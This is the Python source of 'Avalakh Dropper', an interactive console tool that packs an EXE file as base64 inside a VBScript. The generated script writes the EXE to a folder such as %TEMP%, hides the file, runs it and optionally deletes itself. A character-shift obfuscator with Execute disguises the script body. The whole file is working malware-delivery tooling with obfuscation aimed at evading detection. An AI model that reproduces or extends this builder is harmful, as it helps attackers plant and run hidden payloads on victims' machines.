import os
import sys
import base64
import random
import string
from time import sleep
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress
from rich.style import Style
from rich.table import Table
from rich.text import Text
from rich.box import ROUNDED
import colorama
from colorama import Fore, Back, Style as ColoramaStyle
import readline 

colorama.init()

class VBSWrapperGenerator:
    def __init__(self):
        self.console = Console()
        self.options = {
            'input_exe': None,
            'output_vbs': 'output.vbs',
            'drop_path': '%TEMP%',
            'drop_filename': None,
            'hidden_file': True,
            'run_after_drop': True,
            'delete_after_run': False,
            'obfuscate_vbs': True
        }
        self.command_history = []
        self.history_index = 0

    def obfuscate_vbs_code(self, code):
        shift_num = random.randint(4, 7)
        
        obfuscated = ''.join(chr(ord(v) + shift_num) for v in code)
        
        obfuscated = obfuscated.replace('"', '""')
        
        var_name = ''.join(random.choices(string.ascii_letters, k=4))
        
        obfuscated_code = (
            f'{var_name} = "":'
            f'for i = 1 to {len(obfuscated)}: '
            f'{var_name} = {var_name} + chr(Asc(mid("{obfuscated}",i,1)) - ({shift_num})):'
            f'Next:'
            f'Execute {var_name}:'
        )
        
        return obfuscated_code

    def create_vbs_wrapper(self):
        try:
            with open(self.options['input_exe'], 'rb') as f:
                exe_data = f.read()

            encoded_data = base64.b64encode(exe_data).decode('utf-8')
            chunk_size = 50
            b64_chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
            b64_joined = '" & _\n    "'.join(b64_chunks)

            drop_path = self.options['drop_path']
            if drop_path.startswith('%') and drop_path.endswith('%'):
                drop_path_expand = f"objShell.ExpandEnvironmentStrings(\"{drop_path}\")"
            else:
                drop_path_expand = f"\"{drop_path}\""

            drop_filename = self.options['drop_filename'] or os.path.basename(self.options['input_exe'])

            vbs_script = f"""' VBS dropper generated by AvalakhDropper
Option Explicit

Dim objFSO, objShell, strDropPath, strTempFile, strEncodedData

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

strDropPath = {drop_path_expand}
strTempFile = objFSO.BuildPath(strDropPath, "{drop_filename}")

If Not objFSO.FolderExists(strDropPath) Then
    objFSO.CreateFolder(strDropPath)
End If

strEncodedData = "{b64_joined}"

SaveBinaryFromBase64 strTempFile, strEncodedData

If {str(self.options['hidden_file']).lower()} Then
    On Error Resume Next
    objFSO.GetFile(strTempFile).Attributes = 2
    On Error Goto 0
End If

If {str(self.options['run_after_drop']).lower()} Then
    objShell.Run Chr(34) & strTempFile & Chr(34), 1, False
End If

If {str(self.options['delete_after_run']).lower()} Then
    On Error Resume Next
    objFSO.DeleteFile WScript.ScriptFullName, True
    On Error Goto 0
End If

Sub SaveBinaryFromBase64(strFileName, strBase64)
    Dim objXML, objNode, objStream, binData
    Set objXML = CreateObject("MSXML2.DOMDocument.6.0")
    Set objNode = objXML.createElement("base64")
    objNode.dataType = "bin.base64"
    objNode.text = strBase64
    binData = objNode.nodeTypedValue
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write binData
    objStream.SaveToFile strFileName, 2
    objStream.Close
End Sub
"""
            if self.options['obfuscate_vbs']:
                vbs_script = self.obfuscate_vbs_code(vbs_script)

            with open(self.options['output_vbs'], 'w', encoding='utf-8') as f:
                f.write(vbs_script)

            return True

        except Exception as e:
            self.console.print(f"[red]Error: {str(e)}[/red]")
            return False

    def show_banner(self):

        banner = Text()

        banner.append(f"""\n 
        /* ╔─────────────────────────────────────────────────────────────────╗ */
        /* │  .______  .___     .______  .___    .______  .____/\\ .___.__    │ */
        /* │  :      \\ |   |___ :      \\ |   |   :      \\ :   /  \\:   |  \\   │ */
        /* │  |   .   ||   |   ||   .   ||   |   |   .   ||.  ___/|   :   |  │ */
        /* │  |   :   ||   :   ||   :   ||   |/\\ |   :   ||     \\ |   .   |  │ */
        /* │  |___|   | \\      ||___|   ||   /  \\|___|   ||      \\|___|   |  │ */
        /* │      |___|  \\____/     |___||______/    |___||___\\  /    |___|  │ */
        /* │                                                   \\/            │ */
        /* ╚─────────────────────────────────────────────────────────────────╝ */

            Avalakh Dropper - Create Base64-encoded VBS dropper for EXE files
                            Version: 1.0 | Author: K3rnel-Dev
                          Github: https://github.com/k3rnel-dev
        """, style="yellow")
        self.console.print(banner)

    def show_options(self):
        options_table = Table(box=ROUNDED, border_style="blue", title="Options", title_style="bold magenta")
        options_table.add_column("Name", style="cyan", no_wrap=True)
        options_table.add_column("Current Setting", style="green")
        options_table.add_column("Required", style="yellow")
        options_table.add_column("Description", style="white")

        options_data = [
            ("input_exe", self.options['input_exe'] or "Not set", "yes", "Path to input EXE file"),
            ("output_vbs", self.options['output_vbs'], "no", "Output VBS file path"),
            ("drop_path", self.options['drop_path'], "no", "Drop location (%TEMP%, %APPDATA%, etc)"),
            ("drop_filename", self.options['drop_filename'] or "Same as input", "no", "Filename after drop"),
            ("hidden_file", str(self.options['hidden_file']), "no", "Hide file after drop"),
            ("run_after_drop", str(self.options['run_after_drop']), "no", "Run file after drop"),
            ("delete_after_run", str(self.options['delete_after_run']), "no", "Delete VBS after execution"),
            ("obfuscate_vbs", str(self.options['obfuscate_vbs']), "no", "Enable VBS obfuscation")
        ]

        for name, setting, required, desc in options_data:
            options_table.add_row(name, setting, required, desc)

        self.console.print(options_table)

    def show_commands(self):
        commands_table = Table(box=ROUNDED, border_style="green", title="Commands", title_style="bold green")
        commands_table.add_column("Command", style="cyan", no_wrap=True)
        commands_table.add_column("Description", style="white")

        commands = [
            ("set <option> <value>", "Set an option value"),
            ("generate", "Generate the VBS wrapper"),
            ("show options", "Show current options"),
            ("show commands", "Show available commands"),
            ("clear", "Clear the screen"),
            ("history", "Show command history"),
            ("help", "Show this help"),
            ("exit", "Exit the program")
        ]

        for cmd, desc in commands:
            commands_table.add_row(cmd, desc)

        self.console.print(commands_table)

    def set_option(self, option, value):
        if option in self.options:
            if isinstance(self.options[option], bool):
                if value.lower() in ['true', 'yes', 'y', '1']:
                    self.options[option] = True
                elif value.lower() in ['false', 'no', 'n', '0']:
                    self.options[option] = False
                else:
                    self.console.print(f"[red]Invalid boolean value for {option}[/red]")
                    return False
            else:
                self.options[option] = value
            return True
        else:
            self.console.print(f"[red]Unknown option: {option}[/red]")
            return False

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.show_banner()

    def input_with_history(self, prompt):
        def history_up():
            if self.history_index > 0:
                self.history_index -= 1
                return self.command_history[self.history_index]
            return ""
        
        def history_down():
            if self.history_index < len(self.command_history) - 1:
                self.history_index += 1
                return self.command_history[self.history_index]
            return ""

        readline.set_history_length(100)
        for cmd in self.command_history:
            readline.add_history(cmd)

        try:
            line = input(prompt)
            return line
        except (EOFError, KeyboardInterrupt):
            return "exit"

    def main_menu(self):
        self.clear_screen()
        
        while True:
            try:
                prompt = f"{Fore.RED}Avalakh@Dropper #{Fore.RESET} > "
                command = self.input_with_history(prompt).strip().lower()
                
                if not command:
                    continue
                
                if not self.command_history or self.command_history[-1] != command:
                    self.command_history.append(command)
                self.history_index = len(self.command_history)
                
                if command == 'exit':
                    self.console.print("[yellow]Exiting...[/yellow]")
                    break
                    
                elif command == 'help':
                    self.clear_screen()
                    self.show_commands()
                    
                elif command == 'clear':
                    self.clear_screen()
                    
                elif command == 'history':
                    self.console.print("\nCommand history:")
                    for i, cmd in enumerate(self.command_history, 1):
                        self.console.print(f"{i}. {cmd}")
                    print()
                    
                elif command == 'show options':
                    self.clear_screen()
                    self.show_options()
                    
                elif command == 'show commands':
                    self.clear_screen()
                    self.show_commands()
                    
                elif command == 'generate':
                    if not self.options['input_exe'] or not os.path.exists(self.options['input_exe']):
                        self.console.print("[red]Error: Input EXE file not set or does not exist[/red]")
                        continue

                    with Progress() as progress:
                        task = progress.add_task("[cyan]Generating VBS wrapper...", total=100)
                        for i in range(100):
                            sleep(0.02)
                            progress.update(task, advance=1)

                    if self.create_vbs_wrapper():
                        self.console.print(f"\n[green]Success! VBS wrapper created: {self.options['output_vbs']}[/green]")
                    else:
                        self.console.print("\n[red]Failed to create VBS wrapper[/red]")
                        
                elif command.startswith('set '):
                    parts = command.split(' ', 2)
                    if len(parts) < 3:
                        self.console.print("[red]Usage: set <option> <value>[/red]")
                        continue
                    _, option, value = parts
                    if self.set_option(option, value):
                        self.console.print(f"[green]Option {option} set to {value}[/green]")
                else:
                    self.console.print(f"[red]Unknown command: {command}[/red]")
                    self.console.print("[yellow]Type 'help' for available commands[/yellow]")

            except KeyboardInterrupt:
                self.console.print("\n[yellow]Use 'exit' to quit[/yellow]")
            except Exception as e:
                self.console.print(f"[red]Error: {str(e)}[/red]")

if __name__ == "__main__":
    generator = VBSWrapperGenerator()
    generator.main_menu()
